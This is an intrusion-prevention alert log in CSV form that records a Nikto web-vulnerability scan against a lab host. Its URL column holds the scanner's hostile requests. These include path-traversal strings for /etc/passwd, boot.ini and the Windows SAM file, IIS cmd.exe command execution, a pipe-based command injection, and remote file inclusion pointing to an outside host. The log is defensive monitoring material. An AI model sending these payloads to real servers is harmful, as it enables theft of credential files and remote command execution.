attackid,sessionid,repeated,severity,attack,service,srcip,dstip,srcport,dstport,subtype,eventtype,url
44780,7613625,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50862,80,ips,signature,/
12648,7613625,1,medium,HTPasswd.Access,HTTP,172.16.1.2,172.16.2.2,50862,80,ips,signature,/5PkUWXOP.htpasswd
44780,7613625,99,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50862,80,ips,signature,-
44780,7613626,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50864,80,ips,signature,/5PkUWXOP.EXE
44780,7613626,100,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50864,80,ips,signature,-
44780,7613627,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50866,80,ips,signature,/5PkUWXOP.cmd
12475,7613627,1,low,Web.cgi-bin.Access,HTTP,172.16.1.2,172.16.2.2,50866,80,ips,signature,/cgi-bin/
44780,7613627,57,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50866,80,ips,signature,-
44780,7613628,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50868,80,ips,signature,/index.php
15229,7613628,1,medium,Apache.Expect.Header.XSS,HTTP,172.16.1.2,172.16.2.2,50868,80,ips,signature,/
44780,7613628,14,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50868,80,ips,signature,-
44780,7613629,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50870,80,ips,signature,/nikto-test-TXANp1NR.html
44780,7613629,4,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50870,80,ips,signature,-
44780,7613630,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50872,80,ips,signature,/
44780,7613631,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50874,80,ips,signature,/
44780,7613631,2,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50874,80,ips,signature,-
44780,7613632,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50876,80,ips,signature,/
44780,7613633,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50878,80,ips,signature,/TiVoConnect?Command=QueryServer
10604,7613633,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50878,80,ips,signature,/index.php?chemin=..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fetc
15463,7613633,1,high,PHP.URI.Code.Injection,HTTP,172.16.1.2,172.16.2.2,50878,80,ips,signature,/forumdisplay.php?GLOBALS[]=1&f=2&comma=\\\
12699,7613633,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,50878,80,ips,signature,/filemanager/filemanager_forms.php?lib_path=http://cirt.net/rfiinc.txt?
12935,7613633,1,high,MS.IIS.bdir.HTR.Information.Disclosure,HTTP,172.16.1.2,172.16.2.2,50878,80,ips,signature,/scripts/iisadmin/bdir.htr
12560,7613633,1,high,IISadmin.ISM.DLL.Access,HTTP,172.16.1.2,172.16.2.2,50878,80,ips,signature,/scripts/iisadmin/ism.dll
44780,7613633,95,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50878,80,ips,signature,-
44780,7613634,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50880,80,ips,signature,/scripts/samples/search/filetime.idq
12426,7613634,1,low,MS.Exchange.GAL.Disclosure,HTTP,172.16.1.2,172.16.2.2,50880,80,ips,signature,/exchange/root.asp?acs=anon
44780,7613634,28,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50880,80,ips,signature,-
44780,7613635,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50882,80,ips,signature,/pbserver/pbserver.dll
12439,7613635,1,high,MS.IIS.Cpshost.DLL.Access,HTTP,172.16.1.2,172.16.2.2,50882,80,ips,signature,/scripts/cpshost.dll
44780,7613635,99,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50882,80,ips,signature,-
44780,7613636,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50884,80,ips,signature,/webcart/orders/import.txt
29261,7613636,1,medium,WS_FTP.Sensitive.File.Access,HTTP,172.16.1.2,172.16.2.2,50884,80,ips,signature,/ws_ftp.ini
10604,7613636,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50884,80,ips,signature,/admin-serv/tasks/configuration/ViewLog?file=passwd&num=5000&str=&directories=admin-serv%2Flogs%2f..%2f..%2f..%2f..%2f..%2f..%2fetc&id=admin-serv
46767,7613636,1,medium,Novell.NetBasic.Scripting.Server.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50884,80,ips,signature,/nsn/..%5Cutil/chkvol.bas
12699,7613636,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,50884,80,ips,signature,/wikihome/action/conflict.php?TemplateDir=http://cirt.net/rfiinc.txt?
29264,7613636,1,low,CVS.Sensitive.File.Access,HTTP,172.16.1.2,172.16.2.2,50884,80,ips,signature,/CVS/Entries
13116,7613636,1,low,IISsamples.ISSamples.Access,HTTP,172.16.1.2,172.16.2.2,50884,80,ips,signature,/iissamples/issamples/sqlqhit.asp
44780,7613636,85,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50884,80,ips,signature,-
29261,7613636,1,medium,WS_FTP.Sensitive.File.Access,HTTP,172.16.1.2,172.16.2.2,50884,80,ips,signature,-
46767,7613636,7,medium,Novell.NetBasic.Scripting.Server.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50884,80,ips,signature,-
13116,7613636,1,low,IISsamples.ISSamples.Access,HTTP,172.16.1.2,172.16.2.2,50884,80,ips,signature,-
44780,7613637,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50886,80,ips,signature,/domlog.nsf
44780,7613637,7,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50886,80,ips,signature,-
44780,7613638,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50888,80,ips,signature,/
44780,7613639,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50890,80,ips,signature,//
44780,7613639,23,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50890,80,ips,signature,-
27560,7613640,1,low,NaviCOPA.Source.Code.Information.Disclosure,HTTP,172.16.1.2,172.16.2.2,50892,80,ips,signature,/index.html%20
44780,7613640,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50892,80,ips,signature,/852566C90012664F
43336,7613640,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50892,80,ips,signature,/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
12265,7613640,1,low,Escape.Executable,HTTP,172.16.1.2,172.16.2.2,50892,80,ips,signature,/c/winnt/system32/cmd.exe?/c+dir+/OG
12015,7613640,1,high,MS.IIS.Web.Server.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50892,80,ips,signature,/msadc/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir+c:%5c
10604,7613640,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50892,80,ips,signature,/[SecCheck]/..%2f../ext.ini
13106,7613640,1,medium,PHP.HTTP.Request.Filename.Handling.Information.Disclosure,HTTP,172.16.1.2,172.16.2.2,50892,80,ips,signature,/php/php.exe?c:\\winnt\\boot.ini
13011,7613640,1,high,Apache.DOS.Batch.Script.Parsing.Command.Execution,HTTP,172.16.1.2,172.16.2.2,50892,80,ips,signature,/ssi/envout.bat?|dir%20..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\
56146,7613640,1,high,TVT.NVMS-1000.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50892,80,ips,signature,/../../../../../../../../../boot.ini
44780,7613640,30,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50892,80,ips,signature,-
43336,7613640,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50892,80,ips,signature,-
10604,7613640,9,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50892,80,ips,signature,-
13106,7613640,1,medium,PHP.HTTP.Request.Filename.Handling.Information.Disclosure,HTTP,172.16.1.2,172.16.2.2,50892,80,ips,signature,-
14088,7613641,1,medium,HTTP.GET.Request.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,50894,80,ips,signature,/../../../../winnt/repair/sam._
